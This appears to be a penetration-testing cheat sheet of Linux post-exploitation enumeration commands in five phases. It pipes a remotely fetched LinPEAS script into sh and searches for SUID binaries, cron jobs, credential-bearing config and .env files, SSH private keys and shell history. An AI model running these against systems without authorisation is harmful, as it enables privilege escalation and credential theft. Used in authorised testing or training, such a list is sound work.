# === PHASE 1: QUICK WINS ===
# Run WinPEAS/LinPEAS first — always
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Check sudo rights immediately
sudo -l
# SUID binaries
find / -perm -4000 -type f 2>/dev/null
# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# === PHASE 2: USER & SYSTEM CONTEXT ===
# Who are we and what groups?
id && whoami
# OS and kernel version
uname -a && cat /etc/os-release
# All users with shells
cat /etc/passwd | grep -v nologin | grep -v false
# Check for password reuse in home dirs
ls -la /home/

# === PHASE 3: NETWORK & SERVICES ===
# Listening services (internal only?)
ss -tlnp
# Network interfaces — look for dual-homed
ip a
# ARP table — other hosts?
arp -a
# Hosts file
cat /etc/hosts

# === PHASE 4: CRON & SCHEDULED TASKS ===
# System-wide crontabs
cat /etc/crontab
ls -la /etc/cron*
# User crontabs
crontab -l
# Use pspy to snoop processes (run in background)
/tmp/pspy64

# === PHASE 5: INTERESTING FILES ===
# Config files with credentials
find / -name "*.conf" -readable 2>/dev/null | head -20
find / -name "*.env" -readable 2>/dev/null
# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
# History files
cat ~/.bash_history
cat ~/.zsh_history
